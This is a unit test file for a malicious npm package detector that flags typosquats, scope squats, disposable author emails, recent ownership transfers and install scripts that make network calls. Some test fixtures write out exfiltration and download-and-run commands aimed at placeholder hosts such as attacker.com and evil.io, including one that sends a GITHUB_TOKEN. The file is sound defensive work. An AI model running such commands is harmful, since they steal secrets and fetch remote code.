/// <reference types="vite/client" />
// WS-42 — Malicious Package Detection: unit tests.

import { describe, expect, test } from 'vitest'
import {
  DISPOSABLE_EMAIL_DOMAINS,
  KNOWN_MALICIOUS_NPM_PACKAGES,
  NETWORK_CALL_PATTERNS,
  OWNERSHIP_TRANSFER_THRESHOLD_DAYS,
  POPULAR_NPM_PACKAGES,
  SQUATTING_SCOPES,
  TYPOSQUAT_EDIT_DISTANCE,
  checkMaliciousPackage,
  computeMaliciousReport,
  containsHomoglyphSubstitution,
  containsNetworkCall,
  findClosestPopularPackage,
  isNumericSuffixVariant,
  isRecentOwnershipTransfer,
  isScopeSquat,
  isSuspiciousAuthorEmail,
  levenshteinDistance,
} from './maliciousPackageDetection'

// ---------------------------------------------------------------------------
// levenshteinDistance
// ---------------------------------------------------------------------------

describe('levenshteinDistance', () => {
  test('returns 0 for identical strings', () => {
    expect(levenshteinDistance('lodash', 'lodash')).toBe(0)
    expect(levenshteinDistance('', '')).toBe(0)
  })

  test('returns length of other string when one is empty', () => {
    expect(levenshteinDistance('', 'abc')).toBe(3)
    expect(levenshteinDistance('abc', '')).toBe(3)
  })

  test('counts a single substitution as distance 1', () => {
    expect(levenshteinDistance('lodash', 'lodahs')).toBe(2) // swap: 2 edits (not transposition)
    expect(levenshteinDistance('expres', 'express')).toBe(1) // insertion
    expect(levenshteinDistance('expresss', 'express')).toBe(1) // deletion
  })

  test('counts single character insertion as distance 1', () => {
    expect(levenshteinDistance('expres', 'express')).toBe(1)
    expect(levenshteinDistance('mongose', 'mongoose')).toBe(1)
  })

  test('counts single character deletion as distance 1', () => {
    expect(levenshteinDistance('expresss', 'express')).toBe(1)
    expect(levenshteinDistance('loddash', 'lodash')).toBe(1)
  })

  test('correctly distances two very different strings', () => {
    const d = levenshteinDistance('abc', 'xyz')
    expect(d).toBe(3)
  })
})

// ---------------------------------------------------------------------------
// findClosestPopularPackage
// ---------------------------------------------------------------------------

describe('findClosestPopularPackage', () => {
  test('returns null when name IS a popular package (not a typosquat)', () => {
    expect(findClosestPopularPackage('lodash')).toBeNull()
    expect(findClosestPopularPackage('express')).toBeNull()
  })

  test('finds a match at distance 1 (deletion)', () => {
    const result = findClosestPopularPackage('expres') // missing final 's'
    expect(result).not.toBeNull()
    expect(result!.match).toBe('express')
    expect(result!.distance).toBe(1)
  })

  test('finds a match at distance 1 (insertion)', () => {
    const result = findClosestPopularPackage('loddash') // extra 'd'
    expect(result).not.toBeNull()
    expect(result!.match).toBe('lodash')
    expect(result!.distance).toBe(1)
  })

  test('returns null when distance exceeds TYPOSQUAT_EDIT_DISTANCE', () => {
    // 'completely-different' is far from every popular package
    expect(findClosestPopularPackage('completely-different')).toBeNull()
  })

  test('length guard skips candidates whose lengths differ too much', () => {
    // 'express-session' (15 chars) is 8 chars longer than 'express' (7) — well beyond distance 1
    expect(findClosestPopularPackage('express-session')).toBeNull()
  })
})

// ---------------------------------------------------------------------------
// containsHomoglyphSubstitution
// ---------------------------------------------------------------------------

describe('containsHomoglyphSubstitution', () => {
  test('detects digit 1 flanked by letters (l/1 swap)', () => {
    expect(containsHomoglyphSubstitution('l1dash')).toBe(true)
    expect(containsHomoglyphSubstitution('c1ash')).toBe(true)
  })

  test('detects digit 0 flanked by letters (o/0 swap)', () => {
    expect(containsHomoglyphSubstitution('l0dash')).toBe(true)
    expect(containsHomoglyphSubstitution('c0lors')).toBe(true)
  })

  test('returns false for legitimate names with no homoglyphs', () => {
    expect(containsHomoglyphSubstitution('lodash')).toBe(false)
    expect(containsHomoglyphSubstitution('express')).toBe(false)
    expect(containsHomoglyphSubstitution('socket.io')).toBe(false)
  })

  test('returns false when digit is only at start or end (no flanking letters)', () => {
    // '1lodash' — 1 not flanked on both sides by letters → false
    expect(containsHomoglyphSubstitution('sha1')).toBe(false)
    // 'sha1' = s-h-a-1 — the '1' has 'a' before it but nothing after → no match
  })

  test('is case-insensitive (caller passes lowercased name)', () => {
    expect(containsHomoglyphSubstitution('c0lors')).toBe(true)
    // uppercase should still work since caller lowercases
    expect(containsHomoglyphSubstitution('C0LORS'.toLowerCase())).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// isNumericSuffixVariant
// ---------------------------------------------------------------------------

describe('isNumericSuffixVariant', () => {
  test('detects popular-name + digit suffix', () => {
    expect(isNumericSuffixVariant('lodash2')).toBe(true)
    expect(isNumericSuffixVariant('axios1')).toBe(true)
    expect(isNumericSuffixVariant('react3')).toBe(true)
  })

  test('returns false when base name is not a popular package', () => {
    expect(isNumericSuffixVariant('unknownpkg2')).toBe(false)
    expect(isNumericSuffixVariant('mypkg1')).toBe(false)
  })

  test('returns false when there are no trailing digits', () => {
    expect(isNumericSuffixVariant('lodash')).toBe(false)
    expect(isNumericSuffixVariant('express')).toBe(false)
  })

  test('strips scope before checking', () => {
    expect(isNumericSuffixVariant('@evil/lodash2')).toBe(true)
    expect(isNumericSuffixVariant('@acme/axios1')).toBe(true)
  })

  test('is case-insensitive', () => {
    expect(isNumericSuffixVariant('Lodash2')).toBe(true)
    expect(isNumericSuffixVariant('AXIOS1')).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// isScopeSquat
// ---------------------------------------------------------------------------

describe('isScopeSquat', () => {
  test('detects @npm/popularPackage pattern', () => {
    expect(isScopeSquat('@npm/lodash')).toBe(true)
    expect(isScopeSquat('@node/express')).toBe(true)
  })

  test('detects all configured squatting scopes', () => {
    for (const scope of SQUATTING_SCOPES) {
      expect(isScopeSquat(`${scope}/lodash`)).toBe(true)
    }
  })

  test('returns false for legitimate known-public scopes', () => {
    // @babel, @angular etc. are not squatting scopes
    expect(isScopeSquat('@babel/core')).toBe(false)
    expect(isScopeSquat('@angular/common')).toBe(false)
  })

  test('returns false for unscoped packages', () => {
    expect(isScopeSquat('lodash')).toBe(false)
    expect(isScopeSquat('express')).toBe(false)
  })

  test('returns false when bare name is not a popular package', () => {
    expect(isScopeSquat('@npm/myunknownpackage')).toBe(false)
    expect(isScopeSquat('@node/notpopular')).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// containsNetworkCall
// ---------------------------------------------------------------------------

describe('containsNetworkCall', () => {
  test('detects curl', () => {
    expect(containsNetworkCall('curl https://attacker.com/exfil -d "$ENV"')).toBe(true)
  })

  test('detects wget', () => {
    expect(containsNetworkCall('wget http://evil.io/payload.sh | sh')).toBe(true)
  })

  test('detects fetch(', () => {
    expect(containsNetworkCall("fetch('https://evil.io', { method: 'POST', body: data })")).toBe(true)
  })

  test('detects https.request(', () => {
    expect(containsNetworkCall('https.request({ host: "evil.io" }, cb)')).toBe(true)
  })

  test('detects http.get(', () => {
    expect(containsNetworkCall("http.get('http://evil.io/payload', (res) => {})")). toBe(true)
  })

  test('detects http.post(', () => {
    expect(containsNetworkCall('http.post(url, data)')).toBe(true)
  })

  test("detects require('http')", () => {
    expect(containsNetworkCall("const http = require('http')\nhttp.get(url)")).toBe(true)
  })

  test("detects require(\"https\")", () => {
    expect(containsNetworkCall('const h = require("https")')).toBe(true)
  })

  test('detects import from http', () => {
    expect(containsNetworkCall("import http from 'http'")).toBe(true)
  })

  test('detects dns.lookup(', () => {
    expect(containsNetworkCall("dns.lookup('evil.io', (err, addr) => {})")).toBe(true)
  })

  test('detects net.connect(', () => {
    expect(containsNetworkCall("net.connect(4444, 'evil.io')")).toBe(true)
  })

  test('detects new XMLHttpRequest()', () => {
    expect(containsNetworkCall('const xhr = new XMLHttpRequest()')).toBe(true)
  })

  test('detects new WebSocket(', () => {
    expect(containsNetworkCall("const ws = new WebSocket('wss://evil.io')")).toBe(true)
  })

  test('returns false for a normal build script', () => {
    expect(containsNetworkCall('tsc && node scripts/build.js')).toBe(false)
  })

  test('returns false for an empty string', () => {
    expect(containsNetworkCall('')).toBe(false)
  })

  test('returns false for a benign npm lifecycle script', () => {
    expect(containsNetworkCall('node -e "require(\'./scripts/postinstall\')"')).toBe(false)
  })

  test('NETWORK_CALL_PATTERNS array is non-empty', () => {
    expect(NETWORK_CALL_PATTERNS.length).toBeGreaterThan(0)
  })
})

// ---------------------------------------------------------------------------
// isSuspiciousAuthorEmail
// ---------------------------------------------------------------------------

describe('isSuspiciousAuthorEmail', () => {
  test('returns true for mailinator.com', () => {
    expect(isSuspiciousAuthorEmail('attacker@mailinator.com')).toBe(true)
  })

  test('returns true for guerrillamail.com', () => {
    expect(isSuspiciousAuthorEmail('anon@guerrillamail.com')).toBe(true)
  })

  test('returns true for tempmail.com', () => {
    expect(isSuspiciousAuthorEmail('throwaway@tempmail.com')).toBe(true)
  })

  test('returns true for yopmail.com', () => {
    expect(isSuspiciousAuthorEmail('bad@yopmail.com')).toBe(true)
  })

  test('returns true for trashmail.io', () => {
    expect(isSuspiciousAuthorEmail('x@trashmail.io')).toBe(true)
  })

  test('returns false for @gmail.com (legitimate domain)', () => {
    expect(isSuspiciousAuthorEmail('dev@gmail.com')).toBe(false)
  })

  test('returns false for @yahoo.com', () => {
    expect(isSuspiciousAuthorEmail('maintainer@yahoo.com')).toBe(false)
  })

  test('returns false for a corporate email', () => {
    expect(isSuspiciousAuthorEmail('alice@company.io')).toBe(false)
  })

  test('returns false when there is no @ sign', () => {
    expect(isSuspiciousAuthorEmail('notanemail')).toBe(false)
  })

  test('returns false for an empty string', () => {
    expect(isSuspiciousAuthorEmail('')).toBe(false)
  })

  test('uses the rightmost @ for display-name addresses', () => {
    // "Alice <bad@mailinator.com>" style — lastIndexOf('@') finds the domain
    expect(isSuspiciousAuthorEmail('Alice <bad@mailinator.com>')).toBe(true)
  })

  test('domain comparison is case-insensitive', () => {
    expect(isSuspiciousAuthorEmail('user@MAILINATOR.COM')).toBe(true)
    expect(isSuspiciousAuthorEmail('user@Guerrillamail.Com')).toBe(true)
  })

  test('DISPOSABLE_EMAIL_DOMAINS contains at least 20 entries', () => {
    expect(DISPOSABLE_EMAIL_DOMAINS.size).toBeGreaterThanOrEqual(20)
  })
})

// ---------------------------------------------------------------------------
// isRecentOwnershipTransfer
// ---------------------------------------------------------------------------

describe('isRecentOwnershipTransfer', () => {
  const NOW = Date.now()
  const DAY = 24 * 60 * 60 * 1000

  test('returns true for a transfer 1 day ago', () => {
    const date = new Date(NOW - DAY).toISOString()
    expect(isRecentOwnershipTransfer(date, NOW)).toBe(true)
  })

  test('returns true for a transfer 30 days ago', () => {
    const date = new Date(NOW - 30 * DAY).toISOString()
    expect(isRecentOwnershipTransfer(date, NOW)).toBe(true)
  })

  test('returns true for a transfer exactly at the threshold boundary', () => {
    const date = new Date(NOW - OWNERSHIP_TRANSFER_THRESHOLD_DAYS * DAY).toISOString()
    expect(isRecentOwnershipTransfer(date, NOW)).toBe(true)
  })

  test('returns false for a transfer 1 ms past the threshold', () => {
    const date = new Date(NOW - OWNERSHIP_TRANSFER_THRESHOLD_DAYS * DAY - 1).toISOString()
    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
  })

  test('returns false for a transfer 91 days ago', () => {
    const date = new Date(NOW - 91 * DAY).toISOString()
    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
  })

  test('returns false for a transfer 180 days ago', () => {
    const date = new Date(NOW - 180 * DAY).toISOString()
    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
  })

  test('returns false for a future date', () => {
    const date = new Date(NOW + DAY).toISOString()
    expect(isRecentOwnershipTransfer(date, NOW)).toBe(false)
  })

  test('returns false for an invalid / non-parseable date string', () => {
    expect(isRecentOwnershipTransfer('not-a-date', NOW)).toBe(false)
    expect(isRecentOwnershipTransfer('', NOW)).toBe(false)
    expect(isRecentOwnershipTransfer('2099-99-99', NOW)).toBe(false)
  })

  test('OWNERSHIP_TRANSFER_THRESHOLD_DAYS is 90', () => {
    expect(OWNERSHIP_TRANSFER_THRESHOLD_DAYS).toBe(90)
  })
})

// ---------------------------------------------------------------------------
// checkMaliciousPackage — existing signals
// ---------------------------------------------------------------------------

describe('checkMaliciousPackage', () => {
  // ── Clean packages ──────────────────────────────────────────────────────────

  test('returns null for a normal package with no signals', () => {
    expect(checkMaliciousPackage({ name: 'express', version: '4.18.0', ecosystem: 'npm' })).toBeNull()
    expect(checkMaliciousPackage({ name: 'lodash', version: '4.17.21', ecosystem: 'npm' })).toBeNull()
  })

  test('returns null for a non-npm package with no suspicious patterns', () => {
    expect(checkMaliciousPackage({ name: 'requests', version: '2.28.0', ecosystem: 'pypi' })).toBeNull()
  })

  // ── Signal: known_malicious ────────────────────────────────────────────────

  test('fires known_malicious for a confirmed typosquat', () => {
    const finding = checkMaliciousPackage({ name: 'crossenv', version: '1.0.0', ecosystem: 'npm' })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('known_malicious')
    expect(finding!.riskLevel).toBe('critical')
    expect(finding!.similarTo).toBe('cross-env')
  })

  test('fires known_malicious for a high-risk confirmed package', () => {
    const finding = checkMaliciousPackage({ name: 'lodahs', version: '4.17.21', ecosystem: 'npm' })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('known_malicious')
    expect(finding!.riskLevel).toBe('high')
    expect(finding!.similarTo).toBe('lodash')
  })

  test('known_malicious check uses bare name (strips scope)', () => {
    const finding = checkMaliciousPackage({ name: 'crossenv', version: '1.0.0', ecosystem: 'npm' })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('known_malicious')
  })

  test('known_malicious does NOT fire for non-npm ecosystems', () => {
    const finding = checkMaliciousPackage({ name: 'crossenv', version: '1.0.0', ecosystem: 'pypi' })
    if (finding) {
      expect(finding.signals).not.toContain('known_malicious')
    }
  })

  // ── Signal: typosquat_near_popular ─────────────────────────────────────────

  test('fires typosquat_near_popular for edit-distance-1 name', () => {
    const finding = checkMaliciousPackage({ name: 'expres', version: '1.0.0', ecosystem: 'npm' })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('typosquat_near_popular')
    expect(finding!.riskLevel).toBe('high')
    expect(finding!.similarTo).toBe('express')
  })

  test('does NOT fire typosquat_near_popular for scoped packages (scope squat path instead)', () => {
    const finding = checkMaliciousPackage({ name: '@evil/expres', version: '1.0.0', ecosystem: 'npm' })
    if (finding) {
      expect(finding.signals).not.toContain('typosquat_near_popular')
    }
  })

  test('does NOT fire typosquat_near_popular for non-npm ecosystems', () => {
    const finding = checkMaliciousPackage({ name: 'expres', version: '1.0.0', ecosystem: 'pypi' })
    if (finding) {
      expect(finding.signals).not.toContain('typosquat_near_popular')
    }
  })

  // ── Signal: suspicious_name_pattern ───────────────────────────────────────

  test('fires suspicious_name_pattern for numeric suffix variant', () => {
    const finding = checkMaliciousPackage({ name: 'lodash21', version: '1.0.0', ecosystem: 'npm' })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('suspicious_name_pattern')
    expect(finding!.riskLevel).toBe('medium')
    expect(finding!.similarTo).toBe('lodash')
  })

  test('fires suspicious_name_pattern for scope squat', () => {
    const finding = checkMaliciousPackage({ name: '@npm/lodash', version: '4.17.21', ecosystem: 'npm' })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('suspicious_name_pattern')
    expect(finding!.riskLevel).toBe('medium')
    expect(finding!.similarTo).toBe('lodash')
  })

  test('fires suspicious_name_pattern for homoglyph substitution', () => {
    const finding = checkMaliciousPackage({ name: 'l0dash', version: '1.0.0', ecosystem: 'pypi' })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('suspicious_name_pattern')
    expect(finding!.riskLevel).toBe('medium')
  })

  // ── Output shape ───────────────────────────────────────────────────────────

  test('finding includes all required fields', () => {
    const finding = checkMaliciousPackage({ name: 'crossenv', version: '1.0.0', ecosystem: 'npm' })
    expect(finding).not.toBeNull()
    expect(finding!.packageName).toBe('crossenv')
    expect(finding!.ecosystem).toBe('npm')
    expect(finding!.version).toBe('1.0.0')
    expect(finding!.title).toBeTruthy()
    expect(finding!.description).toBeTruthy()
    expect(finding!.evidence).toContain('package=crossenv')
    expect(finding!.evidence).toContain('version=1.0.0')
    expect(finding!.evidence).toContain('signals=[known_malicious]')
  })
})

// ---------------------------------------------------------------------------
// checkMaliciousPackage — Signal 4: install_script_network_call
// ---------------------------------------------------------------------------

describe('checkMaliciousPackage — install_script_network_call', () => {
  test('fires when installScript contains curl', () => {
    const finding = checkMaliciousPackage({
      name: 'innocuous-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'curl https://attacker.com/exfil -d "$HOME"',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('install_script_network_call')
    expect(finding!.riskLevel).toBe('high')
  })

  test('fires when postinstallScript contains wget', () => {
    const finding = checkMaliciousPackage({
      name: 'another-pkg',
      version: '2.0.0',
      ecosystem: 'npm',
      postinstallScript: 'wget http://evil.io/payload | sh',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('install_script_network_call')
  })

  test('fires when postinstallScript contains fetch(', () => {
    const finding = checkMaliciousPackage({
      name: 'fetch-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      postinstallScript: "fetch('https://evil.io', { body: process.env })",
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('install_script_network_call')
  })

  test('does NOT fire when installScript has no network call', () => {
    const finding = checkMaliciousPackage({
      name: 'clean-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'node scripts/postinstall.js',
    })
    expect(finding).toBeNull()
  })

  test('does NOT fire when installScript is absent', () => {
    const finding = checkMaliciousPackage({
      name: 'clean-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
    })
    expect(finding).toBeNull()
  })

  test('evidence string includes installScriptNetworkCall=true', () => {
    const finding = checkMaliciousPackage({
      name: 'spy-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'curl https://attacker.com',
    })
    expect(finding!.evidence).toContain('installScriptNetworkCall=true')
  })

  test('title identifies the lifecycle hook attack vector', () => {
    const finding = checkMaliciousPackage({
      name: 'spy-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'curl https://attacker.com',
    })
    expect(finding!.title).toMatch(/install script/i)
  })

  test('known_malicious + install_script_network_call → risk=critical (max)', () => {
    const finding = checkMaliciousPackage({
      name: 'crossenv',
      version: '1.0.0',
      ecosystem: 'npm',
      postinstallScript: 'curl https://attacker.com -d "$GITHUB_TOKEN"',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('known_malicious')
    expect(finding!.signals).toContain('install_script_network_call')
    expect(finding!.riskLevel).toBe('critical')
  })

  test('typosquat_near_popular + install_script_network_call → risk=high (max)', () => {
    const finding = checkMaliciousPackage({
      name: 'expres',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'wget http://evil.io',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('typosquat_near_popular')
    expect(finding!.signals).toContain('install_script_network_call')
    expect(finding!.riskLevel).toBe('high')
  })
})

// ---------------------------------------------------------------------------
// checkMaliciousPackage — Signal 5: suspicious_author_email
// ---------------------------------------------------------------------------

describe('checkMaliciousPackage — suspicious_author_email', () => {
  test('fires when authorEmail uses a disposable domain', () => {
    const finding = checkMaliciousPackage({
      name: 'some-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      authorEmail: 'anon@mailinator.com',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('suspicious_author_email')
    expect(finding!.riskLevel).toBe('low')
  })

  test('does NOT fire for a legitimate author email', () => {
    const finding = checkMaliciousPackage({
      name: 'some-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      authorEmail: 'developer@gmail.com',
    })
    expect(finding).toBeNull()
  })

  test('does NOT fire when authorEmail is absent', () => {
    const finding = checkMaliciousPackage({
      name: 'some-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
    })
    expect(finding).toBeNull()
  })

  test('evidence string includes the author email', () => {
    const finding = checkMaliciousPackage({
      name: 'spy-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      authorEmail: 'bad@yopmail.com',
    })
    expect(finding!.evidence).toContain('authorEmail=bad@yopmail.com')
  })

  test('suspicious_author_email risk (low) is dominated by typosquat risk (high)', () => {
    const finding = checkMaliciousPackage({
      name: 'expres',
      version: '1.0.0',
      ecosystem: 'npm',
      authorEmail: 'anon@mailinator.com',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('typosquat_near_popular')
    expect(finding!.signals).toContain('suspicious_author_email')
    expect(finding!.riskLevel).toBe('high')
  })

  test('suspicious_author_email alone produces a finding even without name signals', () => {
    const finding = checkMaliciousPackage({
      name: 'legitimately-named-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      authorEmail: 'anon@guerrillamail.com',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toEqual(['suspicious_author_email'])
    expect(finding!.riskLevel).toBe('low')
  })
})

// ---------------------------------------------------------------------------
// checkMaliciousPackage — Signal 6: recent_ownership_transfer
// ---------------------------------------------------------------------------

describe('checkMaliciousPackage — recent_ownership_transfer', () => {
  const RECENT = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString() // 30 days ago
  const OLD = new Date(Date.now() - 200 * 24 * 60 * 60 * 1000).toISOString()   // 200 days ago

  test('fires when lastOwnershipTransferredAt is within 90 days', () => {
    const finding = checkMaliciousPackage({
      name: 'popular-but-transferred',
      version: '3.0.0',
      ecosystem: 'npm',
      lastOwnershipTransferredAt: RECENT,
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('recent_ownership_transfer')
    expect(finding!.riskLevel).toBe('medium')
  })

  test('does NOT fire when transfer was more than 90 days ago', () => {
    const finding = checkMaliciousPackage({
      name: 'popular-but-transferred',
      version: '3.0.0',
      ecosystem: 'npm',
      lastOwnershipTransferredAt: OLD,
    })
    expect(finding).toBeNull()
  })

  test('does NOT fire when lastOwnershipTransferredAt is absent', () => {
    const finding = checkMaliciousPackage({
      name: 'popular-but-transferred',
      version: '3.0.0',
      ecosystem: 'npm',
    })
    expect(finding).toBeNull()
  })

  test('evidence string includes the transfer date', () => {
    const finding = checkMaliciousPackage({
      name: 'spy-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      lastOwnershipTransferredAt: RECENT,
    })
    expect(finding!.evidence).toContain('ownershipTransferredAt=')
  })

  test('typosquat + recent_ownership_transfer → risk=high (max of high/medium)', () => {
    const finding = checkMaliciousPackage({
      name: 'expres',
      version: '1.0.0',
      ecosystem: 'npm',
      lastOwnershipTransferredAt: RECENT,
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('typosquat_near_popular')
    expect(finding!.signals).toContain('recent_ownership_transfer')
    expect(finding!.riskLevel).toBe('high')
  })

  test('title identifies ownership transfer when it is the primary signal', () => {
    const finding = checkMaliciousPackage({
      name: 'clean-name-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      lastOwnershipTransferredAt: RECENT,
    })
    expect(finding!.title).toMatch(/ownership/i)
  })
})

// ---------------------------------------------------------------------------
// checkMaliciousPackage — multi-signal behavioral combinations
// ---------------------------------------------------------------------------

describe('checkMaliciousPackage — multi-signal behavioral', () => {
  const RECENT = new Date(Date.now() - 15 * 24 * 60 * 60 * 1000).toISOString()

  test('all three behavioral signals fire and produce risk=high', () => {
    const finding = checkMaliciousPackage({
      name: 'triple-threat-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'curl https://evil.io -d "$HOME"',
      authorEmail: 'anon@mailinator.com',
      lastOwnershipTransferredAt: RECENT,
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('install_script_network_call')
    expect(finding!.signals).toContain('suspicious_author_email')
    expect(finding!.signals).toContain('recent_ownership_transfer')
    // install_script_network_call = high; author_email = low; transfer = medium → max = high
    expect(finding!.riskLevel).toBe('high')
  })

  test('clean package with clean metadata stays null', () => {
    const finding = checkMaliciousPackage({
      name: 'my-clean-tool',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'node build.js',
      authorEmail: 'dev@company.io',
      lastOwnershipTransferredAt: new Date(Date.now() - 365 * 24 * 60 * 60 * 1000).toISOString(),
    })
    expect(finding).toBeNull()
  })

  test('install_script + suspicious_email but clean name → both behavioral signals', () => {
    const finding = checkMaliciousPackage({
      name: 'cleanname',
      version: '1.0.0',
      ecosystem: 'npm',
      installScript: 'wget http://evil.io | bash',
      authorEmail: 'x@trashmail.me',
    })
    expect(finding).not.toBeNull()
    expect(finding!.signals).toContain('install_script_network_call')
    expect(finding!.signals).toContain('suspicious_author_email')
    expect(finding!.signals).not.toContain('known_malicious')
    expect(finding!.signals).not.toContain('typosquat_near_popular')
    expect(finding!.riskLevel).toBe('high')
  })
})

// ---------------------------------------------------------------------------
// computeMaliciousReport
// ---------------------------------------------------------------------------

describe('computeMaliciousReport', () => {
  test('returns none overallRisk for a clean list', () => {
    const components = [
      { name: 'express', version: '4.18.0', ecosystem: 'npm' },
      { name: 'lodash', version: '4.17.21', ecosystem: 'npm' },
    ]
    const report = computeMaliciousReport(components)
    expect(report.overallRisk).toBe('none')
    expect(report.totalSuspicious).toBe(0)
    expect(report.findings).toHaveLength(0)
  })

  test('counts critical findings correctly', () => {
    const components = [
      { name: 'express', version: '4.18.0', ecosystem: 'npm' },
      { name: 'crossenv', version: '1.0.0', ecosystem: 'npm' },
    ]
    const report = computeMaliciousReport(components)
    expect(report.criticalCount).toBe(1)
    expect(report.overallRisk).toBe('critical')
  })

  test('deduplicates identical components before scanning', () => {
    const components = [
      { name: 'crossenv', version: '1.0.0', ecosystem: 'npm' },
      { name: 'crossenv', version: '1.0.0', ecosystem: 'npm' },
    ]
    const report = computeMaliciousReport(components)
    expect(report.totalSuspicious).toBe(1)
  })

  test('deduplication is case-insensitive for ecosystem and name', () => {
    const components = [
      { name: 'crossenv', version: '1.0.0', ecosystem: 'npm' },
      { name: 'Crossenv', version: '1.0.0', ecosystem: 'NPM' },
    ]
    const report = computeMaliciousReport(components)
    expect(report.totalSuspicious).toBe(1)
  })

  test('findings are sorted critical-first', () => {
    const components = [
      { name: '@npm/lodash', version: '4.17.21', ecosystem: 'npm' }, // medium (scope squat)
      { name: 'crossenv', version: '1.0.0', ecosystem: 'npm' },     // critical
      { name: 'expres', version: '1.0.0', ecosystem: 'npm' },       // high
    ]
    const report = computeMaliciousReport(components)
    expect(report.findings[0].riskLevel).toBe('critical')
    expect(report.findings[1].riskLevel).toBe('high')
    expect(report.findings[2].riskLevel).toBe('medium')
  })

  test('overallRisk escalates to highest severity present', () => {
    const components = [
      { name: 'lodash2', version: '1.0.0', ecosystem: 'npm' },  // medium
      { name: 'crossenv', version: '1.0.0', ecosystem: 'npm' }, // critical
    ]
    const report = computeMaliciousReport(components)
    expect(report.overallRisk).toBe('critical')
  })

  test('summary is clean when no indicators detected', () => {
    const report = computeMaliciousReport([])
    expect(report.summary).toBe('No malicious package indicators detected.')
  })

  test('summary mentions count of findings', () => {
    const components = [{ name: 'crossenv', version: '1.0.0', ecosystem: 'npm' }]
    const report = computeMaliciousReport(components)
    expect(report.summary).toMatch(/1 package/)
    expect(report.summary).toMatch(/critical/)
  })

  test('handles empty component list gracefully', () => {
    const report = computeMaliciousReport([])
    expect(report.findings).toHaveLength(0)
    expect(report.overallRisk).toBe('none')
    expect(report.criticalCount).toBe(0)
    expect(report.highCount).toBe(0)
    expect(report.mediumCount).toBe(0)
    expect(report.lowCount).toBe(0)
  })

  test('multiple known-malicious packages all appear in findings', () => {
    const components = [
      { name: 'crossenv', version: '1.0.0', ecosystem: 'npm' },
      { name: 'electorn', version: '1.0.0', ecosystem: 'npm' },
      { name: 'mongose', version: '1.0.0', ecosystem: 'npm' },
    ]
    const report = computeMaliciousReport(components)
    expect(report.criticalCount).toBe(3)
    expect(report.findings).toHaveLength(3)
  })

  test('passes metadata fields through to checkMaliciousPackage', () => {
    const components = [
      {
        name: 'cleanname-pkg',
        version: '1.0.0',
        ecosystem: 'npm',
        installScript: 'curl https://evil.io',
      },
    ]
    const report = computeMaliciousReport(components)
    expect(report.totalSuspicious).toBe(1)
    expect(report.findings[0].signals).toContain('install_script_network_call')
  })

  test('overallRisk=low when only suspicious_author_email fires', () => {
    const components = [
      {
        name: 'fine-name-pkg',
        version: '1.0.0',
        ecosystem: 'npm',
        authorEmail: 'anon@mailinator.com',
      },
    ]
    const report = computeMaliciousReport(components)
    expect(report.overallRisk).toBe('low')
    expect(report.lowCount).toBe(1)
  })
})

// ---------------------------------------------------------------------------
// Constants / configuration integrity
// ---------------------------------------------------------------------------

describe('configuration constants', () => {
  test('TYPOSQUAT_EDIT_DISTANCE is 1', () => {
    expect(TYPOSQUAT_EDIT_DISTANCE).toBe(1)
  })

  test('POPULAR_NPM_PACKAGES contains at least 50 entries', () => {
    expect(POPULAR_NPM_PACKAGES.size).toBeGreaterThanOrEqual(50)
  })

  test('POPULAR_NPM_PACKAGES contains the most critical ecosystem targets', () => {
    const required = ['lodash', 'express', 'react', 'axios', 'webpack', 'electron', 'mongoose']
    for (const pkg of required) {
      expect(POPULAR_NPM_PACKAGES.has(pkg), `missing ${pkg}`).toBe(true)
    }
  })

  test('KNOWN_MALICIOUS_NPM_PACKAGES contains at least 10 entries', () => {
    expect(KNOWN_MALICIOUS_NPM_PACKAGES.size).toBeGreaterThanOrEqual(10)
  })

  test('every KNOWN_MALICIOUS entry has a non-empty reason and targetsPackage', () => {
    for (const [pkg, entry] of KNOWN_MALICIOUS_NPM_PACKAGES) {
      expect(entry.targetsPackage.length, `${pkg}: empty targetsPackage`).toBeGreaterThan(0)
      expect(entry.reason.length, `${pkg}: empty reason`).toBeGreaterThan(0)
      expect(['critical', 'high']).toContain(entry.riskLevel)
    }
  })

  test('SQUATTING_SCOPES includes @npm and @node', () => {
    expect(SQUATTING_SCOPES.has('@npm')).toBe(true)
